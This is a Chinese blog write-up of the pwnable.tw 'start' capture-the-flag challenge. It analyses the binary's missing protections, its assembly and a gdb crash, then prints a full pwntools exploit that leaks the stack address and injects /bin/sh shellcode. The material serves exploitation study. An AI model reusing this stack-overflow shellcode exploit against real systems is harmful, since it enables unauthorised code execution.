---
title: pwnable.tw start
url: https://www.o2oxy.cn/4253.html
source: print("")
date: 2024-12-02
fetch_date: 2025-10-06T19:36:34.602130
---

# pwnable.tw start

![print("")](https://www.o2oxy.cn/wp-content/themes/JieStyle-Two/images/avatar.jpg)

### print("")

* [Home](http://www.o2oxy.cn)
* [信息安全](https://www.o2oxy.cn/category/%E5%AE%89%E5%85%A8)
* [WEB前端](https://www.o2oxy.cn/category/web%E5%89%8D%E7%AB%AF)
* [linux](https://www.o2oxy.cn/category/linux)
* [python](https://www.o2oxy.cn/category/%E6%95%B0%E6%8D%AE%E5%BA%93)
* [监控](https://www.o2oxy.cn/category/%E7%9B%91%E6%8E%A7)
* [生活](https://www.o2oxy.cn/category/%E7%94%9F%E6%B4%BB)
* [Java学习](https://www.o2oxy.cn/category/%E5%AE%89%E5%85%A8/java)
* [宝塔面板最新活动](https://www.bt.cn/huodong)
* [Author](https://www.o2oxy.cn/tags)

# pwnable.tw start

作者: print("")
分类: [PWN](https://www.o2oxy.cn/category/%E5%AE%89%E5%85%A8/pwn)
发布时间: 2024-12-01 21:22
阅读次数: 1,083 次

题目地址：<https://pwnable.tw/challenge/#1>

## 一、checksec

```
pwnable.tw$ checksec start
[*] '/home/pwn/桌面/pwnable.tw/start'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
pwnable.tw$
```

什么保护都没有打开。

运行一下题目

```
pwnable.tw$ ./start
Let's start the CTF:124545454545
pwnable.tw$ ./start
Let's start the CTF:66666666666666666666666
[8]    5822 segmentation fault (core dumped)  ./start
pwnable.tw$
```

输入长一点就段错误了。

## 二、代码分析

打开IDA发现就一个\_start 啥都没有了

[![](https://www.o2oxy.cn/wp-content/uploads/2024/12/微信截图_20241201210407.jpg)](https://www.o2oxy.cn/wp-content/uploads/2024/12/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20241201210407.jpg)

这里从ELF 文件来看是汇编写的

[![](https://www.o2oxy.cn/wp-content/uploads/2024/12/微信截图_20241201210538.jpg)](https://www.o2oxy.cn/wp-content/uploads/2024/12/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20241201210538.jpg)

```
.text:08048060                 public _start
.text:08048060 _start          proc near               ; DATA XREF: LOAD:08048018↑o
.text:08048060                 push    esp
.text:08048061                 push    offset _exit
.text:08048066                 xor     eax, eax
.text:08048068                 xor     ebx, ebx
.text:0804806A                 xor     ecx, ecx
.text:0804806C                 xor     edx, edx
.text:0804806E                 push    3A465443h
.text:08048073                 push    20656874h
.text:08048078                 push    20747261h
.text:0804807D                 push    74732073h
.text:08048082                 push    2774654Ch
.text:08048087                 mov     ecx, esp        ; addr
.text:08048089                 mov     dl, 14h         ; len
.text:0804808B                 mov     bl, 1           ; fd
.text:0804808D                 mov     al, 4
.text:0804808F                 int     80h             ; LINUX - sys_write
.text:08048091                 xor     ebx, ebx
.text:08048093                 mov     dl, 3Ch
.text:08048095                 mov     al, 3
.text:08048097                 int     80h             ; LINUX -
.text:08048099                 add     esp, 14h
.text:0804809C                 ret
```

有点奇怪的是，一般来说、函数的开头都是

```
push    ebp
mov     ebp, esp
```

这里直接是esp

具体的esp 和ebp 的区别在于

参考：<https://zhuanlan.zhihu.com/p/692696035>

分别给eax,ebx,ecx,edx赋值(4,1,esp,20),然后int 80h系统调用
清ebx,给eax,edx赋值（3，60），然后int 80h系统调用

可以翻译成如下c的伪代码：

```
write(1,esp,20); // 从栈上读20个字节到标准输出（读内存）
read(0,esp,60);  // 从标准输入写60个字节到栈上（写内存）
```

运行程序进行测试、

```
pwnable.tw$ gdb start
GNU gdb (Ubuntu 9.1-0ubuntu1) 9.1
Copyright (C) 2020 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
pwndbg: loaded 192 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
Reading symbols from start...
(No debugging symbols found in start)
pwndbg> r
Starting program: /home/pwn/桌面/pwnable.tw/start
Let's start the CTF:11111111111111111111111

Program received signal SIGSEGV, Segmentation fault.
0x0a313131 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────────────────────────[ REGISTERS ]────────────────────────────────────
 EAX  0x18
 EBX  0x0
 ECX  0xffffd204 ◂— 0x31313131 ('1111')
 EDX  0x3c
 EDI  0x0
 ESI  0x0
 EBP  0x0
 ESP  0xffffd21c —▸ 0xffffd220 ◂— 0x1
 EIP  0xa313131 ('111\n')
─────────────────────────────────────[ DISASM ]─────────────────────────────────────
Invalid address 0xa313131z
```

这里溢出了1111  直接是认为是地址了。

## 三、漏洞点以及利用

首先泄露之前的esp
然后布置shellcode到栈上，并且计算相应的返回地址覆盖eip

画图所示

[![](https://www.o2oxy.cn/wp-content/uploads/2024/12/start.jpg)](https://www.o2oxy.cn/wp-content/uploads/2024/12/start.jpg)

```
from pwn import *

context(os='linux',arch='i386',log_level='debug')

shellcode  = b"\x31\xc0\x50\x68\x2f\x2f\x73"
shellcode += b"\x68\x68\x2f\x62\x69\x6e\x89"
shellcode += b"\xe3\x89\xc1\x89\xc2\xb0\x0b"
shellcode += b"\xcd\x80\x31\xc0\x40\xcd\x80"
print(len(shellcode))
myelf = ELF("./start")
io = process(myelf.path)

payload =b"a"*20
payload += p32(0x08048087)

io.recv()
io.send(payload)

oldesp = u32(io.recv(4))
io.recv()

payload = b"a"*20
payload += p32(oldesp+20)
payload += shellcode

io.send(payload)

io.interactive()
```

如果觉得我的文章对您有用，请随意打赏。您的支持将鼓励我继续创作！

 打赏支持

#### 发表回复 [取消回复](/4253.html#respond)

您的邮箱地址不会被公开。 必填项已用 \* 标注

\*

\*

更多阅读

* [pwnable orw](https://www.o2oxy.cn/4443.html)
* [SQL注入之语义分析](https://www.o2oxy.cn/4414.html)
* [PHP 词法分析/语法分析](https://www.o2oxy.cn/4400.html)

* [ThinkPHP 5.x 代码执行](https://www.o2oxy.cn/2080.html "ThinkPHP 5.x 代码执行")
* [IDEA 调试Java 代码 and PhpStorm 调试PHP代码](https://www.o2oxy.cn/3528.html "IDEA 调试Java 代码 and PhpStorm 调试PHP代码")
* [密码保护：代码审计—– xss](https://www.o2oxy.cn/2116.html "密码保护：代码审计—– xss")
* [Windows10 安装Tensorflow2.3.0-gpu 踩坑记](https://www.o2oxy.cn/2799.html "Windows10 安装Tensorflow2.3.0-gpu 踩坑记")
* [CVE-2024-2961 glibc API Bug 利用](https://www.o2oxy.cn/4193.html "CVE-2024-2961 glibc API Bug 利用")
* [Konga 任意用户登录 分析](https://www.o2oxy.cn/3632.html "Konga 任意用户登录 分析")
* [密码保护：某waf bypass 实践](https://www.o2oxy.cn/2212.html "密码保护：某waf bypass 实践")
* [词法分析 | DFA 的最小化](https://www.o2oxy.cn/4290.html "词法分析 | DFA 的最小化")
* [CVE-2021-22986 F5 BIG-IP 远程代码漏洞复现](https://www.o2oxy.cn/3249.html "CVE-2021-22986  F5 BIG-IP 远程代码漏洞复现")
* [密码保护：某通OA 审计](https://www.o2oxy.cn/2759.html "密码保护：某通OA  审计")

标签云

[Apache2.4.50](https://www.o2oxy.cn/tag/apache2-4-50)
[Apache ShenYu](https://www.o2oxy.cn/tag/apache-shenyu)
[APISIX](https://www.o2oxy.cn/tag/apisix)
[APISIX Dashboard](https://www.o2oxy.cn/tag/apisix-dashboard)
[cc5](https://www.o2oxy.cn/tag/cc5)
[CNVD-2021-49104](https://www.o2oxy.cn/tag/cnvd-2021-49104)
[CNVD-2022-60632](https://www.o2oxy.cn/tag/cnvd-2022-60632)
[CobaltStrike](https://www.o2oxy.cn/tag/cobaltstrike)
[CobaltStrike xss](https://www.o2oxy.cn/tag/cobaltstrike-xss)
[CommonsCollections5](https://www.o2oxy.cn/tag/commonscollections5)
[Confluence CVE-2021-26084](https://www.o2oxy.cn/tag/confluence-cve-2021-26084)
[CVE-2017-18349](https://www.o2oxy.cn/tag/cve-2017-18349)
[CVE-2021-4034](https://www.o2oxy.cn/tag/cve-2021-4034)
[CVE-2021-37580](https://www.o2oxy.cn/tag/cve-2021-37580)
[CVE-2021-41277](https://www.o2oxy.cn/tag/cve-2021-41277)
[CVE-2021-41773](https://www.o2oxy.cn/tag/cve-2021-41773)
[cve-2021-42013](https://www.o2oxy.cn/tag/cve-2021-42013)
[CVE-2021-43798](https://www.o2oxy.cn/tag/cve-2021-43798)
[CVE-2021-44228](https://www.o2oxy.cn/tag/cve-2021-44228)
[CVE-2021-45232](https://www.o2oxy.cn/tag/cve-2021-45232)
[CVE-2021-45232 RCE](https://www.o2oxy.cn/tag/cve-2021-45232-rce)
[CVE-2022-22954](https://www.o2oxy.cn/tag/cve-2022-22954)
[CVE...